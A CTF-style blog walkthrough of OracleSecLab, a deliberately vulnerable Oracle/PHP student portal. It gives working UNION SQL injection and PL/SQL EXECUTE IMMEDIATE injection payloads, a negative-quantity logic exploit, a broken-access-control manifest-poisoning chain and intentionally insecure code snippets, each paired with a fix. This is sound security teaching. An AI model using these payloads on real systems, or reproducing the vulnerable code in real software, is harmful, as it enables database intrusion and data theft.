---
layout: post
title: "OracleSecLab — four Oracle-flavoured web bugs, start to finish"
date: 2026-11-13
author: Nguyen Nam Khanh
tags: [oracle, sql-injection, plsql, business-logic, supply-chain, ctf, walkthrough]
description: >
  A hands-on walkthrough of OracleSecLab, an intentionally vulnerable Oracle +
  PHP student portal I built: UNION SQL injection, a negative-quantity logic
  flaw, a broken-access-control supply-chain chain, and PL/SQL injection through
  EXECUTE IMMEDIATE — each one explained, exploited, and then fixed.
---

> **Lab use only.** OracleSecLab is a *deliberately* vulnerable application I
> wrote for teaching database security. Everything below is done against my own
> copy running on `localhost` in Docker. The weaknesses are intentional — never
> point these techniques at systems you do not own or are not authorised to test.

Most "vulnerable web app" projects you meet while learning — DVWA, WebGoat,
Juice Shop — sit on MySQL, PostgreSQL or SQLite. Oracle is a different animal:
its own SQL dialect (`DUAL`, `ROWNUM`, `USER_TABLES`, `FETCH FIRST`), its own
PL/SQL stored-program model, and its own idioms for injection and enumeration.
So I built **[OracleSecLab](https://github.com/Khanh1916/oracle-sec-lab)** — a
realistic university portal ("FPT Student Portal") on **Oracle 23c Free + PHP 8.3
+ Apache**, with four intentional vulnerabilities hidden among dozens of
perfectly safe pages.

This post is the attacker's-eye walkthrough of all four. For each one I show the
recon, the working payload against the live app, *why* it works, and the fix
that lives in the repo's `secure_versions/`. It supersedes an older three-bug
walkthrough I wrote for the previous version of this app — the code has since
grown a fourth challenge (PL/SQL injection) and a lot more realism.

The four challenges:

| # | Vulnerability | Where | OWASP 2021 |
|---|---|---|---|
| 1 | Oracle UNION SQL injection (fragmented flag) | `search.php?q=` | A03 Injection |
| 2 | Business-logic flaw (negative quantity) | `store.php` | A04 Insecure Design |
| 3 | Broken access control → supply-chain poisoning | `partner_config.php` + `admin.php` | A01 / A06 |
| 4 | Oracle PL/SQL injection (`EXECUTE IMMEDIATE`) | `course_lookup.php` | A03 Injection |

---

## Run it yourself

The whole lab is one command. No manual Oracle install:

```bash
git clone https://github.com/Khanh1916/oracle-sec-lab.git
cd oracle-sec-lab
RANDOMIZE_FLAGS=1 docker compose up -d
```

Then open **http://localhost:8080/dbs401-oracle-app** and log in. The pre-seeded
accounts I use below:

| Username | Password | Role |
|---|---|---|
| `student1` | `Student@123` | Student (150 credits) |
| `admin` | `Admin@DBS401!2024` | Admin |

> **A note on the flags.** Every flag in this lab has the shape `DBS401{...}`.
> I ran my instance with `RANDOMIZE_FLAGS=1`, so each flag in the screenshots is
> a throwaway value unique to that container — not the canonical answer. That is
> deliberate: I want you to be able to follow the *method* without me handing you
> the final strings. Solve it on your own copy and you'll get your own flags.

Here's the portal after logging in as `student1` — a believable academic
dashboard. None of this UI matters to the bugs; it's camouflage.

![The FPT Student Portal dashboard after logging in as a student]({{ '/images/oracle-sec-lab/00-dashboard.jpg' | relative_url }})

---

## Challenge 1 — Oracle UNION SQL injection

### Find the injection point

The **Student Search** page (`search.php`) looks ordinary. Search for a real
major and you get a tidy table of students:

![A normal search for "Software" returning student rows]({{ '/images/oracle-sec-lab/01-search-normal.jpg' | relative_url }})

The classic first probe for SQL injection is a single quote. Send `?q='` and the
page breaks — but gracefully, with a caught error rather than a stack trace:

![A single quote triggers "Search failed. Please check your input."]({{ '/images/oracle-sec-lab/02-search-quote-error.jpg' | relative_url }})

That "Search failed" is the tell. The quote reached the database and broke the
query's syntax. Under the hood, `search.php` builds its SQL by gluing the input
straight into the string:

```php
$sql = "SELECT student_id, full_name, major FROM STUDENTS
        WHERE (full_name LIKE '%$keyword%' OR major LIKE '%$keyword%')
          AND hidden_marker = 'NORMAL' AND ROWNUM <= 5";
```

Our input lands *inside* a `LIKE '%...%'` literal, which itself sits inside
parentheses. So to take over the query we have to (a) close the `%` and the
quote, (b) close the parenthesis, and (c) comment out everything after us. The
breakout prefix is therefore `KEYWORD%') ... --`.

### Mind the keyword blacklist

There is one speed bump: a blacklist that rejects DDL-flavoured words.

```php
$ddlBlacklist = ['DROP','DELETE','UPDATE','INSERT','CREATE','ALTER','TRUNCATE'];
```

`UNION SELECT` isn't on the list, so plain read injection sails through. But note
the trap for later: the check is a case-insensitive substring match, so the
literal text `update_url` (it contains **UPDATE**) is blocked. Keep that in mind
for Challenge 3.

### Column count and types

Oracle `UNION` demands the same column count *and* compatible types on both
sides, and every `SELECT` needs a `FROM` (that's what `DUAL` is for). A naive
`UNION SELECT 1,2,3 FROM DUAL` actually fails here, because columns 2 and 3 are
`VARCHAR2` on the left and numbers on the right — Oracle is strict about that.
Give it strings and it lines up:

```sql
-- three columns: NUMBER, VARCHAR2, VARCHAR2
x%') UNION SELECT 1,'a','b' FROM DUAL--
```

### Enumerate the tables

`USER_TABLES` lists every table the app's schema owns. We put `table_name` in one
of the string columns:

```sql
x%') UNION SELECT ROWNUM, table_name, NULL FROM USER_TABLES WHERE ROWNUM<=14--
```

![UNION injection listing the schema's tables, including FLAGS and CONFIG_STORE]({{ '/images/oracle-sec-lab/03-union-tables.jpg' | relative_url }})

Interesting names jump out: `FLAGS`, `AUDIT_LOGS`, `CONFIG_STORE`,
`ADMIN_SECRETS`, `SYSTEM_HINTS`, and some obvious bait — `FAKE_FLAGS`,
`FLAG_ARCHIVE`. The lab is full of decoys to punish anyone who just greps for the
word "flag".

### The flag is in three pieces, three encodings

Dumping `FLAGS` doesn't give you a flag — it gives you a *fragment*, plus a
decoy:

```sql
x%') UNION SELECT 1, flag_code, flag_part FROM FLAGS--
```

![The FLAGS table yields one real hex fragment and one base64 decoy]({{ '/images/oracle-sec-lab/04-flags-fragments.jpg' | relative_url }})

`FL1_PART_A` is a run of hex (`4442...` → decode as hex bytes → it starts
`DBS401{SQL_`). `FL_DECOY_B` is base64 that cheerfully decodes to
`SOME_FAKE_FLAG_HERE` — ignore it. Two more real pieces are hidden elsewhere, in
*different* encodings, which is the whole point of the challenge:

- **Part B** lives in `AUDIT_LOGS.metadata_note` as a JSON blob with a
  `"fragment"` field that is written **backwards** — reverse it to read it.
- **Part C** lives in `CONFIG_STORE` under `sys_alpha_marker`, **base64**-encoded.

```sql
-- Part B
x%') UNION SELECT 1, metadata_note, action FROM AUDIT_LOGS
     WHERE action='SYSTEM_AUDIT_CHECK'--

-- Part C
x%') UNION SELECT 1, config_value, config_key FROM CONFIG_STORE
     WHERE config_key='sys_alpha_marker'--
```

Decode each piece (hex → ASCII, reverse the string, base64 → ASCII) and
concatenate. The three parts snap together into a single `DBS401{SQL_..._..._...}`
flag. There are also two base64 *decoys* sitting in `CONFIG_STORE`
(`sys_beta_marker`) and `FLAGS` to waste an automated scanner's time — a reminder
that "it decodes cleanly" is not the same as "it's correct".

### The fix

Stop concatenating. Bind the parameter and constrain the input:

```php
$param = '%' . strtolower($keyword) . '%';
$sql   = "SELECT student_id, full_name, major FROM STUDENTS
          WHERE LOWER(full_name) LIKE :kw";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

A blacklist is not a defence — it's a to-do list for the attacker. Bind
variables are. (See `secure_versions/search_secure.php`.)

---

## Challenge 2 — a negative quantity is free money

The **Material Store** (`store.php`) sells a cheap study guide (100 credits) and
one tantalising locked item, *"Exam Leak 2024 (CLASSIFIED)"*, for 999,999
credits. Our student has 150. Hopeless — at first glance.

![The store: 150 credits, a cheap item, and a locked 999,999-credit item]({{ '/images/oracle-sec-lab/06-store-before.jpg' | relative_url }})

The server checks that you can afford the order, but never checks that the
quantity is positive:

```php
$cost = $qty * $price;            // qty comes straight from the form
if ($credits >= $cost) {
    $newCredits = $credits - $cost;   // subtract a negative = add
}
```

Order **−10,000** of the 100-credit guide and the arithmetic inverts:

```text
cost        = -10,000 * 100          = -1,000,000
new_credits =    150 - (-1,000,000)  =  1,000,150
```

Subtracting a negative number *adds* it. The balance rockets past 999,999, and
the classified item unlocks on the spot:

![After ordering a negative quantity, credits jump to 1,000,150 and the flag unlocks]({{ '/images/oracle-sec-lab/07-store-flag.jpg' | relative_url }})

No injection, no special tooling — just an input the designer never imagined.
This is why it maps to A04, *Insecure Design*: the code does exactly what it was
written to do.

### The fix

Validate the boundary server-side, every time:

```php
if ($qty <= 0 || $qty > 100) {
    $msg = "Quantity must be between 1 and 100.";
} elseif ($credits < $cost) {
    $msg = "Insufficient credits.";
} else {
    $newCredits = $credits - $cost;
}
```

Client-side `min="1"` on the input is cosmetic; the attacker never uses your
form. (See `secure_versions/store_secure.php`.)

---

## Challenge 3 — broken access control into a supply-chain poison

This one is a chain. The admin panel can "check for updates": it reads a partner
**manifest URL** from the database, fetches that JSON, and if the manifest
advertises a newer version it processes the payload. Poison the URL and you
control what the admin's server fetches.

### Recon: find the hidden config

The admin panel only shows *public* config rows. The juicy one —
`update_url` — is marked private, so it never appears in the UI. But we already
have SQL injection from Challenge 1, so we dump `CONFIG_STORE` directly.

Here's the blacklist biting us: a payload containing the text `update_url` is
rejected (it contains "UPDATE"). The workaround is simply **not to name it** —
dump the whole table and read the row from the results:

```sql
x%') UNION SELECT 1, config_key, config_value FROM CONFIG_STORE
     WHERE config_key NOT LIKE 'runtime%'--
```

![SQLi reveals the private update_url and the app_version from CONFIG_STORE]({{ '/images/oracle-sec-lab/05-config-recon.jpg' | relative_url }})

Now we know the server fetches updates from
`http://127.0.0.1:8081/manifest.json` and that the current `app_version` is
`3.1.0`. To trigger the update path, our manifest must claim a *higher* version.

### Broken access control: the config page trusts anyone

There's a hidden page, `partner_config.php`, that lets you change that URL. It's
labelled **"ADMIN ONLY"** — but the label is the only thing guarding it. The
code checks that you're logged in, and nothing more. So an ordinary student
walks right in and edits partner infrastructure:

![A logged-in student can open the admin-only partner configuration page]({{ '/images/oracle-sec-lab/08-partner-config-student.jpg' | relative_url }})

We point the manifest URL at a payload of our choosing. (In a real engagement
you'd host this on your own box; in the lab I serve a second manifest,
`demo.json`, that claims version `9.9.9` and carries the expected `flag_part`.)
The student's save succeeds — access control simply isn't enforced:

![The student successfully overwrites the partner manifest URL]({{ '/images/oracle-sec-lab/09-partner-poisoned.jpg' | relative_url }})

### Spring the trap as admin

Now the admin "checks for updates" (`admin.php?check_updates=1`). The server
fetches our poisoned manifest, sees `9.9.9 > 3.1.0`, trusts it, takes the
`flag_part` hex from *our* file, combines it with a server-side secret half, and
hex-decodes the result straight onto the page:

![The admin update check fetches the poisoned manifest and reveals the supply-chain flag]({{ '/images/oracle-sec-lab/10-admin-flag.jpg' | relative_url }})

"Update successful! System upgraded to version 9.9.9" — and out drops the flag.
One student with no privileges got code/data of their choosing executed in the
admin's trust context. That's the shape of a real supply-chain attack: you don't
breach the target, you breach something the target *trusts*.

### The fix

Three independent failures, three fixes:

1. **Enforce the role.** `partner_config.php` must check
   `$_SESSION['role'] === 'admin'` before writing anything.
2. **Allowlist the origin.** The update URL should be validated against a short
   list of approved hosts, not accepted as free text.
3. **Verify a signature.** Sign manifests (HMAC/RSA) and reject anything that
   doesn't verify — a higher version number is not proof of authenticity.

(See `secure_versions/partner_config_secure.php` and `admin_update_secure.php`.)

---

## Challenge 4 — PL/SQL injection through EXECUTE IMMEDIATE

The last one is the most Oracle-specific, and my favourite, because it looks
*safe*. The **Course Info** lookup (`course_lookup.php`) passes the course code
as a **bind variable**:

```php
$sql = "SELECT FN_COURSE_LOOKUP(:code) AS info FROM DUAL";
oci_bind_by_name($stmt, ':code', $code);   // textbook-correct, right?
```

Any scanner that only looks at the PHP will call this clean. A normal code
returns a normal course name:

![A normal course-code lookup returns "Database Security"]({{ '/images/oracle-sec-lab/11-course-normal.jpg' | relative_url }})

But binding at the call site doesn't help if the *stored function* is the thing
that's vulnerable. Look inside `FN_COURSE_LOOKUP`:

```sql
v_sql := 'SELECT course_name FROM COURSES WHERE course_code = ''' || p_code || '''';
EXECUTE IMMEDIATE v_sql INTO v_result;
```

The bound value arrives safely in PL/SQL — and then the function rebuilds a SQL
string by concatenation and runs it with `EXECUTE IMMEDIATE`. The injection
happens *inside the database*, one layer below where PHP "protected" it. This is
the key lesson: **a bind variable only protects the statement it's bound to.**

### The single-row trap

The function returns one value via `... INTO v_result`, so your injected query
must return **exactly one row**. The flag lives in a `PLSQL_VAULT` table that
also holds a decoy row, so the obvious payload returns two rows and Oracle
raises `TOO_MANY_ROWS`, which the function reports as "Ambiguous result":

```sql
zzz' UNION SELECT secret_flag FROM PLSQL_VAULT--
```

![The naive UNION returns two rows and fails with "Ambiguous result"]({{ '/images/oracle-sec-lab/12-course-ambiguous.jpg' | relative_url }})

Filter down to the single real row and the flag comes back dressed up as a
course name:

```sql
zzz' UNION SELECT secret_flag FROM PLSQL_VAULT WHERE label='CHALLENGE_4'--
```

![Filtering to one row extracts Flag 4 through the PL/SQL injection]({{ '/images/oracle-sec-lab/13-course-flag.jpg' | relative_url }})

### The fix

Fix the stored program, not just the call site. Prefer static SQL with no
dynamic string at all:

```sql
SELECT course_name INTO v_result FROM COURSES WHERE course_code = p_code;
```

If you genuinely need dynamic SQL, **bind** inside `EXECUTE IMMEDIATE` too, and
never concatenate user input:

```sql
EXECUTE IMMEDIATE 'SELECT course_name FROM COURSES WHERE course_code = :c'
  INTO v_result USING p_code;
```

And run the function with **invoker's rights** (`AUTHID CURRENT_USER`) so the web
role can't reach tables like `PLSQL_VAULT` through it. (See
`secure_versions/course_lookup_secure.php`.)

---

## What the lab is really teaching

Four bugs, four different root causes — and not one of them is exotic:

- **Challenge 1 — trust in a blacklist.** String-built SQL plus a keyword
  denylist is injection waiting to happen. Bind variables, not blocklists.
- **Challenge 2 — trust in the client.** The browser form said "1 or more"; the
  attacker said "−10,000". Validate every boundary on the server.
- **Challenge 3 — trust in a label and a version number.** An "ADMIN ONLY"
  banner is not access control, and a bigger version is not a signature. Enforce
  roles, allowlist origins, verify payloads.
- **Challenge 4 — trust in the wrong layer.** A bind variable at the PHP boundary
  is worthless if the stored function concatenates and `EXECUTE IMMEDIATE`s. Fix
  the code that actually builds the query.

Every finding has a matching hardened version in the repo's `secure_versions/`,
so you can diff the vulnerable and the safe implementation side by side. If you
want to try it cold, grab the lab and solve it before re-reading this — the flags
in your container will be yours alone.

> Source and full setup: **[github.com/Khanh1916/oracle-sec-lab](https://github.com/Khanh1916/oracle-sec-lab)**

---

*Written by **Nguyen Nam Khanh** ([@Khanh1916](https://github.com/Khanh1916)).*
